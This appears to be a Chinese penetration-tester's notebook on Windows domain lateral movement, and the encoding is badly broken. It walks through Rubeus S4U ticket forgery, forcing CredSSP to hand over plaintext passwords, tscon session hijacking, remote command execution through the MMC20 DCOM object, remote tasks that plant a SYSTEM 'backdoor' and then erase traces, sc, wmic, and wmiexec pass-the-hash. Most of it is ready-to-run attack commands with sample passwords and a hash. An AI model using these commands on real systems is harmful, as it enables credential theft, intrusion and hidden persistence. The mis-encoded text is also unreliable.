è‹¥æˆ‘ä»¬çš„administratorç”¨æˆ·è¢«è®¾ç½®ä¸ºæ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾æˆ–è€…è¢«åŠ å…¥ä¿æŠ¤ç»„ï¼ŒæŒ‰ç†è¯´ä»–çš„è®¿é—®å°±ä¸èƒ½è¿›è¡Œå§”æ´¾ã€‚ æˆ‘ä»¬åœ¨ä»¥administratorè´¦æˆ·èº«ä»½è¿›è¡ŒS4Uæ—¶ï¼Œåªèƒ½è¿›è¡ŒS4U2SELFï¼Œä¸èƒ½è¿›è¡ŒS4U2PROXYã€‚æˆ‘ä»¬ç”¨ Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /pttç»§ç»­å®éªŒadministratorï¼Œå‘ç°ç¡®å®æ˜¯è¿™æ · æ­¤æ—¶æˆ‘ä»¬ç”¨ rubeus.exe describe /ticker:S4Ubase64åŠ å¯†çš„ç¥¨æ® å¯ä»¥å‘ç°servicenameå¹¶æ²¡æœ‰æŒ‡å®šæŸä¸ªæœåŠ¡ï¼Œä»…ä»…åªæœ‰ä¸€ä¸ªè´¦æˆ·.å³å‘ç”Ÿäº†æœåŠ¡åç§°ç¼ºå¤±çš„é—®é¢˜ã€‚å¾ˆç®€å•ï¼ŒæŠŠç¥¨æ®ä¿®æ”¹ä¸€ä¸‹å°±è¡Œäº†.ç½‘ä¸Šå¾ˆå¤šè¯´ç”¨è¿™ä¸ªå·¥å…·https://www.pkisolutions.com/tools/asn1editor/ä½†å®é™…ä¸Šrubeusä¹Ÿèƒ½å®Œæˆç¥¨æ®ä¿®æ”¹rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt å®Œäº‹ credssp å¯¼å‡ºç”¨æˆ·æ˜æ–‡å¯†ç CredSSPåè®®çš„ç›®çš„æ˜¯å°†ç”¨æˆ·çš„æ˜æ–‡å¯†ç ä»CredSSPå®¢æˆ·ç«¯å§”æ´¾ç»™CredSSPæœåŠ¡å™¨ã€‚ é€šå¸¸è¿ç”¨äºè¿œç¨‹æ¡Œé¢æœåŠ¡ã€‚ æˆ‘ä»¬åœ¨é…ç½®è¿™ä¸ªåè®®æ—¶ï¼Œä¸€èˆ¬åœ¨ç»„ç­–ç•¥ç¼–è¾‘å™¨é‡Œé…ç½®ã€‚ Allow delegating default credentialsè¡¨ç¤ºåœ¨é€šè¿‡ä½¿ç”¨å—ä¿¡ä»»çš„X509è¯ä¹¦æˆ–Kerberoså®ç°æœåŠ¡å™¨èº«ä»½éªŒè¯æ—¶è‡ªåŠ¨å‘é€å½“å‰ç”¨æˆ·çš„å‡­æ®ï¼Œå³æ˜æ–‡å¯†ç ã€‚ Allow delegating default credentials with NTLM-only server authenticationè¡¨ç¤ºåœ¨é€šè¿‡NTLMå®ç°æœåŠ¡å™¨èº«ä»½éªŒè¯æ—¶è‡ªåŠ¨å‘é€å½“å‰ç”¨æˆ·çš„å‡­æ®ï¼Œå³æ˜æ–‡å¯†ç ã€‚ è¿™å‡ ä¸ªå±æ€§åœ¨æ³¨å†Œè¡¨é‡Œå¯¹åº” HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegationã€‚ æ”»å‡»åŸç†é‚£ä¹ˆè¿™æ ·çœ‹ï¼Œè¿™ä¸ªæ”»å‡»æµç¨‹å°±å¾ˆè‡ªç„¶äº†ã€‚æˆ‘ä»¬è¦è·å¾—ä¸¤å°æœºå™¨ï¼Œä¸€å°æœºå™¨å½“ä½œè¿œç¨‹æ¡Œé¢çš„æœåŠ¡å™¨ï¼Œä¸€å°å½“ä½œè¿œç¨‹æ¡Œé¢çš„å®¢æˆ·ç«¯ã€‚åœ¨å®¢æˆ·ç«¯ä¸Šé…ç½®ç»„ç­–ç•¥ï¼ˆCREDSSPï¼‰ï¼Œä½¿å…¶åœ¨è¿œç¨‹æ¡Œé¢èº«ä»½éªŒè¯æ—¶å‘é€æ˜æ–‡å¯†ç ã€‚ç„¶åå¼€å§‹è¿œç¨‹æ¡Œé¢éªŒè¯ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè·å¾—å®¢æˆ·ç«¯å‘æ¥çš„æ˜æ–‡å¯†ç . å®æ“1.é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œæ”¹å˜ç»„ç­–ç•¥èº«ä»½éªŒè¯çš„å‡­æ®ç­–ç•¥(é€‰ä¸€ä¸ªï¼‰ï¼Œè¿™ä¸€æ­¥éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæœ¬åœ°æˆ–åŸŸç®¡ reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation &#x2F;v AllowDefaultCredentials &#x2F;t REG_DWORD &#x2F;d 1reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation &#x2F;v AllowDefCredentialsWhenNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefault &#x2F;t REG_DWORD &#x2F;d 1reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefaultCredentials &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefCredentialsWhenNTLMOnly &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d * ä¸€è‚¡è„‘è®¾ç½®å¥½å°±å®Œäº‹äº†ã€‚ã€‚ï¼ˆç”¨æˆ·éœ€é‡æ–°ç™»é™†æ‰ç”Ÿæ•ˆï¼‰ ç„¶åå¼€å§‹è·å–å¯†ç  æˆ‘ä»¬åˆšåˆšæåˆ°éœ€è¦ä¸¤å°ç”µè„‘æ‰èƒ½è·å–å¯†ç ï¼Œå…¶å®é‚£åªæ˜¯ä¸€ä¸ªæ¨¡å‹ï¼Œä¸€ä¸ªæœºå™¨æ—¢å¯ä»¥å½“ä½œå®¢æˆ·ç«¯åˆå¯ä»¥å½“ä½œæœåŠ¡ç«¯çš„ã€‚æˆ‘ä»¬ç”¨kekeoå®ç°æ”»å‡»ï¼ˆæœ¬æœºå‘æœ¬æœºè·å–å¯†ç æ—¶ï¼Œæ™®é€šç”¨æˆ·å³å¯å®Œæˆä»¥ä¸‹æ“ä½œï¼‰ tsssp::server å¼€å¯æœåŠ¡ç«¯tsssp::client &#x2F;target:... å¼€å¯å®¢æˆ·ç«¯ï¼Œè¿™é‡Œçš„targetéšä¾¿å¡« é‚£ä¹ˆå†å›åˆ°éœ€è¦ä¸¤ä¸ªæœºå™¨ï¼Œä¸€ä¸ªå½“æœåŠ¡ç«¯ä¸€ä¸ªå½“å®¢æˆ·ç«¯çš„æƒ…å†µå§ã€‚ æœåŠ¡ç«¯å»ºç«‹: tsssp::server éœ€è¦SYSTEMæƒé™ å®¢æˆ·ç«¯é“¾æ¥: tsssp::client /target:æœåŠ¡ç«¯çš„SPNï¼ˆä¸€èˆ¬é‡‡ç”¨TERMSRVæœåŠ¡ï¼‰ /pipe: \\æœåŠ¡ç«¯åŸŸå\\pipe\\kekeo_tsssp_endpoint æ™®é€šç”¨æˆ·æƒé™å³å¯ tsconæ¨ªå‘è‹¥ä¸€ä¸ªæœºå™¨ä¸Šæœ‰å¤šä¸ªç”¨æˆ·ç™»å½•ï¼Œåˆ™åœ¨ä»»åŠ¡ç®¡ç†å™¨å¯ä»¥çœ‹è§å¦‚ä¸‹åœºé¢ å…¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å³é”®å…¶ä»–ç”¨æˆ·é€‰æ‹©é“¾æ¥ï¼Œè¾“å…¥å…¶å¯†ç åå°±èƒ½è¿›å…¥å…¶æ¡Œé¢ ä½†æ˜¯å¯¹äºsystemç”¨æˆ·æ¥è¯´ï¼Œè¦é“¾æ¥åˆ°å…¶ä»–ç”¨æˆ·æ˜¯ä¸éœ€è¦è¾“å…¥å¯†ç çš„ï¼Œå¯ä»¥ç›´æ¥è¿æ¥ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡systemæƒé™è·å–ç™»å½•åœ¨å½“å‰æœºå™¨ä¸Šçš„åŸŸç”¨æˆ·æƒé™ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„administratoræ˜¯åŸŸç®¡ï¼Œæˆ‘æœ‰å½“å‰æœºå™¨çš„systemæƒé™ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥ç›´æ¥ç”¨ä»¥ä¸‹å‘½ä»¤å®Œæˆç”¨æˆ·æƒé™è·å¾—ã€‚ query user è·å¾—administratorç”¨æˆ·çš„id å¯ä»¥å‘ç°adminçš„idæ˜¯2ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨tsconè¿™ä¸ªwindowsè‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…·å®Œæˆæƒé™è·å¾—ã€‚ cmd /k tscon 2 /dest:console æ‰§è¡Œä»¥ä¸Šå‘½ä»¤ï¼Œæˆ‘ä»¬è·³è½¬åˆ°äº†adminçš„æ¡Œé¢ åˆ©ç”¨COM/DCOMå¯¹è±¡å‚è€ƒ:https://www.freebuf.com/articles/network/256372.html å‰è¨€DCOMæ˜¯COMçš„æ‰©å±•ï¼Œå…è®¸åº”ç”¨ç¨‹åºå®ä¾‹åŒ–å’Œè®¿é—®è¿œç¨‹è®¡ç®—æœºä¸Šçš„COMå¯¹è±¡ã€‚è¿™é‡Œç®€è¦è¯´ä¸€ä¸‹å‡ ä¸ªæœ‰å…³COMçš„æ¦‚å¿µ CLSIDï¼šåˆå«CLASSID ä¸€ä¸ªCOMç±»çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œæ¯ä¸€ä¸ªWindowsæ³¨å†Œç±»ä¸ä¸€ä¸ªCLSIDç›¸å…³è”ã€‚é•¿å¾—åƒè¿™æ · {20D04FE0-3AEA-1069-A2D8-08002B30309D} ProgIDï¼šå…¶å¯è¢«ç”¨ä½œå¯¹ç”¨æˆ·æ›´å‹å¥½çš„æ›¿ä»£çš„ä¸€ä¸ªCLSIDï¼Œæ¯”å¦‚MMC20.APPLICATION.1å°±æ˜¯ä¸€ä¸ªProgIDã€‚ProgIDä¸èƒ½ä¿è¯æ˜¯å”¯ä¸€çš„ï¼Œå¹¶éæ¯ä¸ªç±»éƒ½ä¸ProgIDç›¸å…³è” Appid: ä¸ºäº†ä¿è¯COMå¯¹è±¡èƒ½è¢«é¡ºåˆ©çš„è¿œç¨‹è°ƒç”¨ï¼ˆå³ä¸ºäº†ä½¿DCOMå¯è®¿é—®COMå¯¹è±¡ï¼‰ï¼Œéœ€è¦æŠŠAPPIDä¸è¯¥ç±»çš„CLSIDç›¸å…³è”ï¼Œä¸”AppIDéœ€è®¾ç½®æƒé™æ¥è§„åˆ’å“ªäº›å®¢æˆ·ç«¯èƒ½å¤Ÿè®¿é—® æˆ‘ä»¬å¯ä»¥é€šè¿‡powershellæ‰§è¡Œget-CimInstance æ¥åˆ—å‡ºæœ¬åœ°COMç¨‹åºåˆ—è¡¨ è¿œç¨‹DCOMå¯¹è±¡å®ä¾‹åŒ–çš„æµç¨‹: å®¢æˆ·ç«¯ä»è¿œç¨‹è®¡ç®—æœºè¯·æ±‚å®ä¾‹åŒ–ç”±CLSIDè¡¨ç¤ºçš„å¯¹è±¡ã€‚å¦‚æœå®¢æˆ·ç«¯ä½¿ç”¨ProgIDåˆ™å…ˆå°†å…¶æœ¬åœ°è§£æä¸ºCLSIDã€‚è¿œç¨‹è®¡ç®—æœºæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç”±è¯¥CLSIDæ‰€å…³è”çš„AppIDï¼Œå¹¶éªŒè¯å®¢æˆ·ç«¯çš„æƒé™ã€‚DCOMLaunchæœåŠ¡å°†åˆ›å»ºæ‰€è¯·æ±‚çš„ç±»çš„å®ä¾‹ï¼Œé€šå¸¸æ˜¯é€šè¿‡è¿è¡ŒLocalServer32å­é¡¹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ–è€…é€šè¿‡åˆ›å»ºDllHostè¿›ç¨‹æ¥æ‰¿è½½InProcServer32å­é¡¹å¼•ç”¨çš„dllã€‚å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºå’ŒæœåŠ¡å™¨è¿›ç¨‹é—´å»ºç«‹é€šä¿¡ï¼Œå®¢æˆ·ç«¯ä¾¿å¯ä»¥è®¿é—®æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚ MMC20.APPLICATION.1ä¸­æ–‡åä¸ºï¼š Microsoftç®¡ç†æ§åˆ¶å°ï¼ˆMMCï¼‰2.0åŒ…æ‹¬è„šæœ¬å¯¹è±¡æ¨¡å‹ã€‚ æˆ‘ä»¬ä¸€æ­¥æ­¥æŠ½ä¸å‰¥èŒ§è·Ÿè¸ªä¸€ä¸‹è¿™ä¸ªå¯¹è±¡çš„åˆ©ç”¨ç‚¹ï¼Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯è°ƒç”¨è¯¥å¯¹è±¡å¿…é¡»è¦æœ‰ç®¡ç†å‘˜æƒé™ã€‚ å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å…ˆåˆ—å‡ºåœ¨MMC20.APPLICATIONä¸­çš„æ¨¡å—ï¼Œç„¶åç»§ç»­åˆ—å‡ºå…¶ä¸­Documentä¸­çš„å±æ€§ï¼Œå†ç»§ç»­åˆ—å‡ºDocument.ActiveViewä¸­çš„å±æ€§ã€‚å¯ä»¥å‘ç°ä¸€ä¸ªåä¸ºExecuteShellCommandçš„æ–¹æ³•ï¼Œå…‰æ˜¯å¬åå­—å°±çŸ¥é“æ˜¯å¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„æ–¹æ³•äº†ã€‚åˆ°å¾®è½¯æ–‡æ¡£æŸ¥ä¸€æŸ¥è¿™ä¸ªæ–¹æ³•ï¼Œè·å¾—äº†ä»¥ä¸‹ä¿¡æ¯ã€‚ ExecuteShellCommandï¼ˆ[å‘½ä»¤][ç›®å½•][åæ•°][çª—å£çŠ¶æ€]ï¼‰å‘½ä»¤ä¸€ä¸ªå€¼ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å¯ä»¥æŒ‡å®šæ ‡å‡†è·¯å¾„ã€‚Commandä¸­åŒ…å«çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ˆä¾‹å¦‚â€œï¼…windirï¼…â€ï¼‰éƒ½å°†è¢«æ‰©å±•ã€‚ç›®å½•ä¸€ä¸ªå€¼ï¼Œç”¨äºæŒ‡å®šå·¥ä½œç›®å½•çš„åç§°ã€‚Directoryä¸­åŒ…å«çš„æ‰€æœ‰ç¯å¢ƒå˜é‡éƒ½å°†è¢«æ‰©å±•ã€‚å¦‚æœâ€œç›®å½•â€ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåˆ™å°†å½“å‰ç›®å½•ç”¨ä½œå·¥ä½œç›®å½•ã€‚å‚æ•°ä¸€ä¸ªæŒ‡å®šCommandè¦ä½¿ç”¨çš„å‚æ•°ï¼ˆå¦‚æœæœ‰ï¼‰çš„å€¼ï¼›å‚æ•°å¿…é¡»ç”¨ç©ºæ ¼åˆ†éš”ã€‚ä¾‹å¦‚ï¼Œå°†å‚æ•°æŒ‡å®šä¸ºâ€œ Param1 Param2â€ä¼šå¯¼è‡´Commandæ¥æ”¶Param1å’ŒParam2ä½œä¸ºå‚æ•°ã€‚å¦‚æœè¦æ±‚å•ä¸ªå‚æ•°ç”¨åŒå¼•å·å¼•èµ·æ¥ï¼Œè¯·ä½¿ç”¨é€‚åˆæ‚¨çš„ç¼–ç¨‹è¯­è¨€çš„æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œåœ¨Microsoft Visual Basicä¸­ï¼Œå°†å‚æ•°æŒ‡å®šä¸ºâ€œ Param1â€â€œè¿™æ˜¯Param2â€â€œâ€å¯¼è‡´å‘½ä»¤æ¥æ”¶åˆ°å‚æ•°1å’Œâ€œè¿™æ˜¯Param2â€ã€‚çª—å£çŠ¶æ€ä¸€ä¸ªæŒ‡å®šçª—å£çŠ¶æ€çš„å€¼ã€‚è¯¥å€¼å¯ä»¥æ˜¯ä»¥ä¸‹å­—ç¬¦ä¸²å€¼ä¹‹ä¸€ï¼Œä¹Ÿå¯ä»¥æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚å¦‚æœä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåˆ™é»˜è®¤ä¸ºâ€œå·²æ¢å¤â€ã€‚â€œMaximizedâ€è¯¥å‘½ä»¤åœ¨æœ€å¤§åŒ–çš„çª—å£ä¸­æ‰§è¡Œã€‚â€œMinimizedâ€è¯¥å‘½ä»¤åœ¨æœ€å°åŒ–çš„çª—å£ä¸­æ‰§è¡Œã€‚â€œRestoredâ€è¯¥å‘½ä»¤åœ¨å·²æ¢å¤æˆ–æ­£å¸¸çš„çª—å£ä¸­æ‰§è¡Œã€‚æ³¨æ„ï¼šè¿™é‡Œä¼šå¼¹ä¸ªé»‘æ¡†æ¡†è¿”å›å€¼æ­¤æ–¹æ³•ä¸è¿”å›å€¼ã€‚ äºæ˜¯ä¹ï¼Œæˆ‘ä»¬å°±èƒ½ç†æ‰€åº”å½“çš„æƒ³åˆ°è¿™ä¸ªä¸œè¥¿å¯ä»¥è¢«ç”¨äºæœ¬åœ°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œå°±åƒè¿™æ · [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot;)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;) æˆ‘ä»¬è¿›ä¸€æ­¥å‘æ˜å…¶æ¨ªå‘ç§»åŠ¨çš„èƒ½åŠ› æˆ‘ä»¬çŸ¥é“DCOMå…·æœ‰é€šè¿‡ç½‘ç»œä¸å¯¹è±¡è¿›è¡Œäº¤äº’çš„èƒ½åŠ›ï¼Œåœ¨æˆ‘ä»¬æ˜¯ç®¡ç†å‘˜çš„å‰æä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨GetTypeFromProgID()ä¸powershellè¿›è¡ŒDCOMè¿œç¨‹äº¤äº’ã€‚GetTypeFromProgID(â€œCOMâ€,â€è¿œç¨‹ipâ€) å³å¯æŒ‡å®šä¸å“ªä¸€ä¸ªè¿œç¨‹IPè¿›è¡Œäº¤äº’ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠpayloadæ”¹é€ æˆè¿™æ ·ï¼Œè¿›è€Œå¯ä»¥åœ¨å…¶ä»–æœºå™¨ä¸Šè¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¨ªå‘ç§»åŠ¨çš„ç›®çš„ [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot; ï¼Œâ€œè¿œç¨‹ipâ€)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;) ipcipcç®€ä»‹IPC$æ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œé€šè¿‡æä¾›å¯ä¿¡ä»»çš„ç”¨æˆ·åå’Œå£ä»¤ï¼Œå³èƒ½å»ºç«‹é“¾æ¥ï¼Œè¾¾åˆ°è®¿é—®è¿œç¨‹è®¡ç®—æœºçš„ç›®çš„ã€‚ipcå…±äº«è¿æ¥æˆåŠŸåä¸€èˆ¬èƒ½å…±äº«æ‰€æœ‰å…±äº«ç›˜ç¬¦ã€‚ï¼ˆä¹Ÿå°±æ˜¯IPCè¿æ¥åå¯ä»¥è¿œç¨‹å…±äº«C$,D$ç­‰ï¼‰ åˆ©ç”¨è¿™ä¸ªé“¾æ¥ä¸ä»…å¯ä»¥è®¿é—®ç›®æ ‡æœºå™¨ä¸­çš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸Šä¼ ä¸‹è½½ç­‰æ“ä½œï¼Œè¿˜èƒ½åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œéƒ¨åˆ†å‘½ä»¤ã€‚ net use \\\\ip\\ipc$ &quot;password&quot; &#x2F;user:username å¦‚æœè´¦æˆ·å’Œå£ä»¤æ­£ç¡®ï¼Œå°±å»ºç«‹å¥½äº†é“¾æ¥ã€‚ å»ºç«‹å¥½é“¾æ¥åå°±èƒ½æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ dir \\\\192.168.183.130\\c$ åˆ—å‡ºCç›˜copy C:\\Users\\douser\\Desktop\\whoami.txt \\\\192.168.183.130\\c$ ä¸Šä¼ æ–‡ä»¶tasklist &#x2F;S 192.168.183.130 &#x2F;U administrator &#x2F;P liu78963 åˆ—å‡ºæŸIPä¸Šçš„è¿›ç¨‹ä¿¡æ¯ï¼Œ&#x2F;UæŒ‡å®šå“ªä¸ªç”¨æˆ·æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œ&#x2F;pæŒ‡å®šè¯¥ç”¨æˆ·å¯†ç net use \\\\IP &#x2F;del &#x2F;y åˆ é™¤é“¾æ¥net use æŸ¥çœ‹å·²å»ºç«‹çš„ipcé“¾æ¥ åˆ©ç”¨ipcæ¨ªå‘ç§»åŠ¨atat \\\\192.168.183.130 17:05:00 cmd.exe &#x2F;c &quot;&lt;å‘½ä»¤&gt;&quot;at \\\\192.168.183.130 17:05:00 powershell.exe -c &quot;&lt;å‘½ä»¤&gt;&quot; å…³äºæ—¶é—´çš„è·å¾—ï¼Œå¯ä»¥ä½¿ç”¨ net time \\\\IP è·å¾—ã€‚ è®¡åˆ’ä»»åŠ¡æ‰§è¡Œåéœ€è¦åˆ é™¤ï¼Œä¸ç•™ç—•è¿¹ at \\\\192.168.183.130 1 &#x2F;delete &#x2F;&#x2F;1ä¸ºä»»åŠ¡çš„ID å…³äºæ­¤æ–¹æ³•æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡copyä¸Šä¼ æ¶æ„æ–‡ä»¶ç„¶åé€šè¿‡atæ¥æ‰§è¡Œå®ƒï¼Œæˆ–è€…ç›´æ¥é€šè¿‡powershellè¿œç¨‹åŠ è½½ä¸Šçº¿ç­‰ schtasksatå‘½ä»¤å·²ç»è¢«Windows Vistaã€Windows Server 2008åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»ŸåºŸå¼ƒäº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯schtaskså‘½ä»¤ã€‚ æ¨ªå‘ç§»åŠ¨çš„å¤§è‡´æ€è·¯ä¸atå·®ä¸å¤šã€‚ åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªåç§°ä¸ºâ€œbackdoorâ€çš„è®¡åˆ’ä»»åŠ¡ã€‚è¯¥è®¡åˆ’ä»»åŠ¡æ¯åˆ†é’Ÿå¯åŠ¨ä¸€æ¬¡ï¼Œå¯åŠ¨ç¨‹åºä¸ºæˆ‘ä»¬ä¹‹å‰åˆ°Cç›˜ä¸‹çš„shell.exeï¼Œå¯åŠ¨æƒé™ä¸ºsystemã€‚schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\\shell.exe &#x2F;ru system &#x2F;f ä½†ä¹Ÿæœ‰äº›æ—¶å€™ï¼Œç”±äºå½“å‰æƒé™æˆ–ç»„ç­–ç•¥è®¾ç½®ç­‰åŸå› ï¼Œè¯¥schtasksæ–¹æ³•è¿œç¨‹åˆ›å»ºè®¡åˆ’ä»»åŠ¡å¯èƒ½ä¼šæŠ¥é”™æ‹’ç»è®¿é—®,é‡åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥åŠ ä¸Š&#x2F;uå’Œ&#x2F;på‚æ•°åˆ†åˆ«è®¾ç½®é«˜æƒé™ç”¨æˆ·åå’Œå¯†ç  schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;u username &#x2F;p password &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\\shell.exe &#x2F;ru system &#x2F;få¦å¤–ï¼Œåœ¨æˆ‘ä»¬åˆ›å»ºå¥½è®¡åˆ’ä»»åŠ¡åï¼Œå¯ä»¥é€šè¿‡ä¸‹åˆ—æŒ‡ä»¤ç«‹å³è®©è®¡åˆ’ä»»åŠ¡æ‰§è¡Œï¼ˆå¦‚æœæ‹’ç»è®¿é—®çš„è¯å°±åŠ ä¸Š&#x2F;u &#x2F;på‚æ•°ï¼‰schtasks &#x2F;run &#x2F;s 192.168.183.130 &#x2F;i &#x2F;tn backdoor &#x2F;&#x2F; iï¼šå¿½ç•¥ä»»ä½•é™åˆ¶ç«‹å³è¿è¡Œä»»åŠ¡è®¡åˆ’ä»»åŠ¡æ‰§è¡Œåéœ€è¦æ¸…ç†ç—•è¿¹schtasks &#x2F;delete &#x2F;s 192.168.183.130 &#x2F;tn &quot;backdoor&quot; &#x2F;f scè¿™ä¸ªå‘½ä»¤å¯ä»¥æ“æ§æœåŠ¡ã€‚ sc \\\\[ä¸»æœºå&#x2F;IP] create [servicename] binpath&#x3D; &quot;[path]&quot; #åˆ›å»ºæœåŠ¡ï¼Œå…¶ä¸­binpathå¯ä»¥æ˜¯æŸä¸ªexeæ–‡ä»¶çš„è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€æ®µæŒ‡ä»¤ã€‚å½“ä¸ºè·¯å¾„æ—¶ï¼ŒæœåŠ¡å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥exeæ–‡ä»¶ï¼Œå½“ä¸ºæŒ‡ä»¤æ—¶ï¼ŒæœåŠ¡å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥æŒ‡ä»¤sc \\\\[host] start [servicename] å¯åŠ¨æŸä¸ªæœåŠ¡sc \\\\[host] delete [servicename] #åˆ é™¤æœåŠ¡ wmiä»Windows 98å¼€å§‹ï¼ŒWindowsæ“ä½œç³»ç»Ÿéƒ½æ”¯æŒWMIã€‚WMIæ˜¯ç”±ä¸€ç³»åˆ—å·¥å…·é›†ç»„æˆçš„ï¼Œå¯ä»¥é€šè¿‡/nodeé€‰é¡¹ä½¿ç”¨ç«¯å£135ä¸Šçš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)è¿›è¡Œé€šä¿¡ä»¥è¿›è¡Œè¿œç¨‹è®¿é—®ï¼Œå®ƒå…è®¸ç³»ç»Ÿç®¡ç†å‘˜è¿œç¨‹æ‰§è¡Œè‡ªåŠ¨åŒ–ç®¡ç†ä»»åŠ¡ï¼Œä¾‹å¦‚è¿œç¨‹å¯åŠ¨æœåŠ¡æˆ–æ‰§è¡Œå‘½ä»¤ã€‚å¹¶ä¸”wimcæ‰§è¡Œå‘½ä»¤æ—¶ä¸ä¼šç•™ä¸‹æ—¥å¿—ä¿¡æ¯ã€‚ é€šè¿‡wmicåœ¨è¿œç¨‹ä¸»æœºä¸Šå¼€å¯è¿›ç¨‹ wmic &#x2F;node:192.168.183.130 &#x2F;user:administrator &#x2F;password:Liu78963 process call create &quot;command&quot; wmiexecé€šè¿‡wmicåˆ›å»ºè¿œç¨‹è¿›ç¨‹æ—¶ï¼Œä¸ä¼šæœ‰å›æ˜¾ï¼Œéœ€è¦é€šè¿‡ipc$é“¾æ¥typeï¼Œé‡å®šå‘ç­‰æ‰‹æ®µæ‰èƒ½çœ‹åˆ°å›æ˜¾ç»“æœï¼Œå°±å¾ˆä¸æ–¹ä¾¿ï¼Œwmicexecçš„å‡ºç°å°±å¾ˆå¥½çš„è§£å†³äº†è¿™ä¸€ç—›ç‚¹ã€‚å…·ä½“åŸç†æ˜¯é€šè¿‡wmicåœ¨135ç«¯å£è¿›è¡Œäº¤äº’ï¼Œå†æŠŠå†…å®¹é€šè¿‡445ç«¯å£ä¼ å›æ¥ã€‚ wmiexecæ™®éæ¥è¯´æœ‰ä¸‰ç§ç‰ˆæœ¬.pyï¼Œexeï¼Œ.vbsã€‚å¯ä»¥èµ°socks5åè®®ä»£å…¥å†…ç½‘ï¼Œæœç»äº†bypassavçš„éº»çƒ¦ã€‚(exeç‰ˆæœ¬ç½‘ä¸Šä¼¼ä¹å¾ˆä¸å¥½æ‰¾) è¿™é‡Œç”¨pythonç‰ˆæœ¬ï¼Œä¸‹è½½é“¾æ¥https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22ï¼Œ impacketæŒ‰ç…§ç½‘ä¸Šå®‰è£…æ¥å¼„å°±è¡Œäº†1.ç¯å¢ƒlinuxï¼Œæˆ‘ä»¬é…ç½®å¥½proxychanisä»£å…¥å†…ç½‘ï¼ˆç•¥2.proxychains wmiexec.py åŸŸå/ç”¨æˆ·å:å¯†ç @ip è·å¾—shell3.ä¹Ÿå¯ä»¥è¿›è¡Œhashä¼ é€’ python wmiexec.py -hashes LM Hash:NT Hash åŸŸå/ç”¨æˆ·å@ç›®æ ‡IP æ•ˆæœå›¾ winrmâ€‹ 